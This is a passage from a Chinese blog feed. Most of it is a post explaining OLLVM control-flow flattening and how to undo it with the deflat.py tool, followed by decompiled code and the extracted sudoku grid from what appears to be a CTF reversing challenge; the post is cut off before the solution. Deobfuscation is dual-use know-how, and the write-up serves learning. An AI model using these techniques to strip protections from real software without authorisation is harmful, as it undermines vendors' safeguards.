class="line"></span><br><span class="line">        else:</span><br><span class="line">            msgbox.showerror(title=&#x27;错误&#x27;, message=&#x27;视频链接地址无效，请重新输入！&#x27;)</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    函数说明:tkinter窗口居中</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def center(self):</span><br><span class="line">        ws = self.root.winfo_screenwidth()</span><br><span class="line">        hs = self.root.winfo_screenheight()</span><br><span class="line">        x = int((ws / 2) - (self.w / 2))</span><br><span class="line">        y = int((hs / 2) - (self.h / 2))</span><br><span class="line">        self.root.geometry(&#x27;&#123;&#125;x&#123;&#125;+&#123;&#125;+&#123;&#125;&#x27;.format(self.w, self.h, x, y))</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    函数说明:loop等待用户事件</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def loop(self):</span><br><span class="line">        # 禁止修改窗口大小</span><br><span class="line">        self.root.resizable(False, False)</span><br><span class="line">        # 窗口居中</span><br><span class="line">        self.center()</span><br><span class="line">        self.root.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app = APP()  # 实例化APP对象</span><br><span class="line">    app.loop()  # loop等待用户事件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>linkpwn的编程学习</category>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>去除控制流平坦化</title>
    <url>/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/</url>
    <content><![CDATA[<h2 id="什么是OLLVM的平坦化"><a href="#什么是OLLVM的平坦化" class="headerlink" title="什么是OLLVM的平坦化"></a>什么是OLLVM的平坦化</h2><p><strong>控制流平坦化</strong> 是 OLLVM 提供的一种<strong>代码混淆</strong>技术。它的核心目标是<strong>破坏程序原始的控制流结构</strong>，使其变得难以阅读和分析，从而增加逆向工程和破解的难度。</p>
<h2 id="OLLVM的平坦化是如何实现的？"><a href="#OLLVM的平坦化是如何实现的？" class="headerlink" title="OLLVM的平坦化是如何实现的？"></a>OLLVM的平坦化是如何实现的？</h2><p>原始代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a &gt; 5&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a &lt;= 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>经过平坦化后：</strong></p>
<ol>
<li><strong>创建“分发器”和一个状态变量</strong>：<ul>
<li>引入一个<strong>状态变量</strong>（例如 <code>state</code>），它决定了下一个要执行哪个基本块。</li>
<li>创建一个<strong>循环结构</strong>作为分发器，其内部是一个巨大的 <code>switch-case</code> 语句，<code>case</code> 的值就是 <code>state</code> 的值。</li>
</ul>
</li>
<li><strong>拆分原始基本块</strong>：<ul>
<li>将原始函数中的所有基本块（除了入口块）都提取出来。</li>
<li>为每个基本块分配一个<strong>唯一的状态值</strong>（例如，原始块 <code>B</code> 对应 <code>state = 2</code>）。</li>
</ul>
</li>
<li><strong>重写基本块末尾的指令</strong>：<ul>
<li>这是最关键的一步。修改每个基本块的<strong>结束指令</strong>（如 <code>jmp</code>, <code>br</code>， <code>ret</code>），使其不再是直接跳转到下一个块，而是<strong>更新状态变量 <code>state</code><strong>，然后</strong>跳回到分发器循环</strong>。</li>
<li>例如，原始基本块 <code>A</code> 执行完后应该跳转到块 <code>B</code>。平坦化后，块 <code>A</code> 的末尾被修改为 <code>state = 2; goto dispatcher;</code>。</li>
</ul>
</li>
<li><strong>在分发器中调度</strong>：<ul>
<li>分发器循环不停地检查 <code>state</code> 的值，然后通过 <code>switch-case</code> 跳转到对应的基本块去执行。</li>
<li>执行完的基本块会设置新的 <code>state</code>，然后跳回分发器，分发器再根据新的 <code>state</code> 调度下一个基本块。</li>
</ul>
</li>
</ol>
<p>平坦化后的伪代码结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> state = <span class="number">0</span>; <span class="comment">// 初始状态</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;    <span class="comment">// 分发器循环</span></span><br><span class="line">        <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// 初始块，通常做变量初始化</span></span><br><span class="line">                a = <span class="number">10</span>;</span><br><span class="line">                <span class="keyword">if</span> (a &gt; <span class="number">5</span>) &#123;</span><br><span class="line">                    state = <span class="number">1</span>; <span class="comment">// 下一个状态是 “printf(&quot;a &gt; 5&quot;)” 块</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    state = <span class="number">2</span>; <span class="comment">// 下一个状态是 “printf(&quot;a &lt;= 5&quot;)” 块</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;a &gt; 5&quot;</span>);</span><br><span class="line">                state = <span class="number">3</span>; <span class="comment">// 下一个状态是 “return 0” 块</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;a &lt;= 5&quot;</span>);</span><br><span class="line">                state = <span class="number">3</span>; <span class="comment">// 下一个状态是 “return 0” 块</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// state 不再更新，循环终止</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="如何去OLLVM的平坦化"><a href="#如何去OLLVM的平坦化" class="headerlink" title="如何去OLLVM的平坦化"></a>如何去OLLVM的平坦化</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>首先我要下载这个deflat这个工具，将py文件和要处理的文件放在同一个目录中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python deflat.py -f OLLVM-deflat --addr 0x4006F0</span><br><span class="line">python deflat.py -f 需要处理的文件 --addr 起始地址</span><br></pre></td></tr></table></figure>

<p>起始地址用IDA查看，比如main的起始地址。</p>
<p>本题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python deflat.py -f OLLVM-deflat --addr 0x4006F0</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x400870</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x401470</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x4018B0</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x401F50</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x402AC0</span><br></pre></td></tr></table></figure>

<p>让我们来看看效果</p>
<p>未去：</p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/%E6%9C%AA%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96.png" alt="1"></p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/%E6%9C%AA%E5%8E%BB.png" alt="2"></p>
<p>已去：</p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/%E5%8E%BB%E9%99%A4%E5%B9%B3%E5%9D%A6%E5%8C%96.png" alt="1"></p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/%E5%B7%B2%E5%8E%BB.png" alt="1"></p>
<p>很明显去除后逻辑更加清晰。</p>
<p>去除后再开始解题：</p>
<p>general_inspection验证sudoku的合法性</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">general_inspection</span><span class="params">(<span class="type">int</span> (*a1)[<span class="number">9</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mm; <span class="comment">// [rsp+100h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+108h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> s[<span class="number">12</span>]; <span class="comment">// [rsp+110h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> (*v12)[<span class="number">9</span>]; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = a1;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x28u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">9</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12[i][j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">10</span>; ++k )</span><br><span class="line">          s[k] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">9</span>; ++m )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12[i][m] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( s[v12[i][m]] )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            s[v12[i][m]] = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; <span class="number">10</span>; ++n )</span><br><span class="line">          s[n] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt; <span class="number">9</span>; ++ii )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12[ii][j] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( s[v12[ii][j]] )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            s[v12[ii][j]] = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt; <span class="number">10</span>; ++jj )</span><br><span class="line">          s[jj] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt; <span class="number">3</span>; ++kk )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt; <span class="number">3</span>; ++mm )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v12[kk - <span class="number">-3</span> * (i / <span class="number">3</span>)][mm - <span class="number">-3</span> * (j / <span class="number">3</span>)] )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( s[v12[<span class="number">3</span> * (i / <span class="number">3</span>)][<span class="number">9</span> * kk + <span class="number">3</span> * (j / <span class="number">3</span>) + mm]] )</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">              s[v12[<span class="number">3</span> * (i / <span class="number">3</span>)][<span class="number">9</span> * kk + mm - <span class="number">-3</span> * (j / <span class="number">3</span>)]] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> trace对sudoku进行求解</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">trace</span><span class="params">(__int64 a1, <span class="type">int</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+78h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+7Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+80h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+84h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">671940414</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">while</span> ( v13 == <span class="number">-2124394493</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v4 = <span class="number">338033522</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( v17 &lt; <span class="number">9</span> )</span><br><span class="line">                    v4 = <span class="number">-1264962160</span>;</span><br><span class="line">                  v13 = v4;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( v13 != <span class="number">-2084617164</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                ++a3;</span><br><span class="line">                v17 = a2[<span class="number">12</span> * v14];</span><br><span class="line">                v16 = a2[<span class="number">12</span> * v14 + <span class="number">1</span>];</span><br><span class="line">                v13 = <span class="number">295419890</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v13 != <span class="number">-2069701336</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v5 = <span class="number">942378879</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v16 &lt; <span class="number">9</span> )</span><br><span class="line">                v5 = <span class="number">1672958513</span>;</span><br><span class="line">              v13 = v5;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v13 != <span class="number">-1561315505</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v13 = <span class="number">2016120547</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v13 != <span class="number">-1361654796</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++v16;</span><br><span class="line">          v13 = <span class="number">-2069701336</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v13 != <span class="number">-1289862082</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v13 = <span class="number">-1361654796</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v13 != <span class="number">-1264962160</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">      v13 = <span class="number">-2069701336</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">-1246113443</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-446534017</span>:</span><br><span class="line">        v9 = <span class="number">1764791757</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !a2[<span class="number">12</span> * v14 + <span class="number">2</span>] )</span><br><span class="line">          v9 = <span class="number">1923573299</span>;</span><br><span class="line">        v13 = v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-264375465</span>:</span><br><span class="line">        *(_DWORD *)(<span class="number">36LL</span> * a2[<span class="number">12</span> * v14] + a1 + <span class="number">4LL</span> * a2[<span class="number">12</span> * v14 + <span class="number">1</span>]) = <span class="number">0</span>;</span><br><span class="line">        ++a3;</span><br><span class="line">        --v14;</span><br><span class="line">        v13 = <span class="number">-446534017</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-127108152</span>:</span><br><span class="line">        a2[<span class="number">12</span> * v14] = v17;</span><br><span class="line">        a2[<span class="number">12</span> * v14 + <span class="number">1</span>] = v16;</span><br><span class="line">        v7 = findvalue(a1, &amp;a2[<span class="number">12</span> * v14]);</span><br><span class="line">        v8 = <span class="number">295419890</span>;</span><br><span class="line">        *(_DWORD *)(<span class="number">36LL</span> * v17 + a1 + <span class="number">4LL</span> * v16) = v7;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(<span class="number">36LL</span> * v17 + a1 + <span class="number">4LL</span> * v16) == <span class="number">-1</span> )</span><br><span class="line">          v8 = <span class="number">1601744610</span>;</span><br><span class="line">        v13 = v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">67917660</span>:</span><br><span class="line">        *(_DWORD *)(<span class="number">36LL</span> * a2[<span class="number">12</span> * v14] + a1 + <span class="number">4LL</span> * a2[<span class="number">12</span> * v14 + <span class="number">1</span>]) = v15;</span><br><span class="line">        a2[<span class="number">12</span> * v14 + <span class="number">2</span> + v15] = <span class="number">1</span>;</span><br><span class="line">        --a2[<span class="number">12</span> * v14 + <span class="number">2</span>];</span><br><span class="line">        v13 = <span class="number">-2084617164</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">295419890</span>:</span><br><span class="line">        ++v14;</span><br><span class="line">        a3 = a3 - <span class="number">1146223301</span> + <span class="number">1146223300</span>;</span><br><span class="line">        v13 = <span class="number">-1289862082</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">338033522</span>:</span><br><span class="line">        v13 = <span class="number">671940414</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">376448068</span>:</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        v13 = <span class="number">-2124394493</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">599244415</span>:</span><br><span class="line">        v11 = <span class="number">-2084617164</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v15 &lt; <span class="number">10</span> )</span><br><span class="line">          v11 = <span class="number">1332608024</span>;</span><br><span class="line">        v13 = v11;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">671940414</span>:</span><br><span class="line">        v3 = <span class="number">-1246113443</span>;</span><br><span class="line">        <span class="keyword">if</span> ( a3 )</span><br><span class="line">          v3 = <span class="number">376448068</span>;</span><br><span class="line">        v13 = v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">942378879</span>:</span><br><span class="line">        v13 = <span class="number">1396614849</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1332608024</span>:</span><br><span class="line">        v12 = <span class="number">-1561315505</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !a2[<span class="number">12</span> * v14 + <span class="number">2</span> + v15] )</span><br><span class="line">          v12 = <span class="number">67917660</span>;</span><br><span class="line">        v13 = v12;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1396614849</span>:</span><br><span class="line">        ++v17;</span><br><span class="line">        v13 = <span class="number">-2124394493</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1601744610</span>:</span><br><span class="line">        *(_DWORD *)(<span class="number">36LL</span> * v17 + a1 + <span class="number">4LL</span> * v16) = <span class="number">0</span>;</span><br><span class="line">        --v14;</span><br><span class="line">        v13 = <span class="number">-446534017</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1672958513</span>:</span><br><span class="line">        v6 = <span class="number">-1289862082</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">36LL</span> * v17 + a1 + <span class="number">4LL</span> * v16) )</span><br><span class="line">          v6 = <span class="number">-127108152</span>;</span><br><span class="line">        v13 = v6;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1751405620</span>:</span><br><span class="line">        <span class="built_in">printf</span>(aGameOver);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1764791757</span>:</span><br><span class="line">        v15 = <span class="number">1</span>;</span><br><span class="line">        v13 = <span class="number">599244415</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1923573299</span>:</span><br><span class="line">        v10 = <span class="number">-264375465</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v14 )</span><br><span class="line">          v10 = <span class="number">1751405620</span>;</span><br><span class="line">        v13 = v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        ++v15;</span><br><span class="line">        v13 = <span class="number">599244415</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>check1</p>
<ul>
<li><strong>前半部分与后半部分交换</strong></li>
<li><strong>每对相邻字符交换</strong></li>
<li><strong>位操作和算术变换</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">check1</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+6Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+6Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+70h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = a1[v5];</span><br><span class="line">    a1[v5] = a1[i];</span><br><span class="line">    a1[i] = v3;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(a1); j += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a1[j];</span><br><span class="line">    a1[j] = a1[j + <span class="number">1</span>];</span><br><span class="line">    a1[j + <span class="number">1</span>] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( k &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a1[k] = (a1[k] &amp; <span class="number">0xF3</span> | ~a1[k] &amp; <span class="number">0xC</span>) - <span class="number">20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>check3就是个验证函数</p>
<p>check2检查输入字符串是否能正确填充一个数独网格</p>
<p>提取数独</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">5</span> <span class="number">3</span> <span class="number">2</span> <span class="number">7</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span></span><br><span class="line"><span class="number">8</span> <span class="number">0</span> <span class="number">9</span> <span class="number">0</span> <span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">5</span> <span class="number">0</span> <span class="number">3</span></span><br><span class="line"><span class="number">4</span> <span class="number">9</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">9</span> <span class="number">0</span> <span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="number">0</span> <span class="number">3</span> <span class="number">2</span> <span class="number">9</span> <span class="number">0</span> <span class="number">4</span> <span class="number">8</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">6</span> <span class="number">0</span> <span class="number">5</span> <span class="number">4</span> <span class="number">0</span> <span class="number">8</span> <span class="number">0</span> <span class="number">9</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">2</span> <span class="number">1</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>求解数独</p>
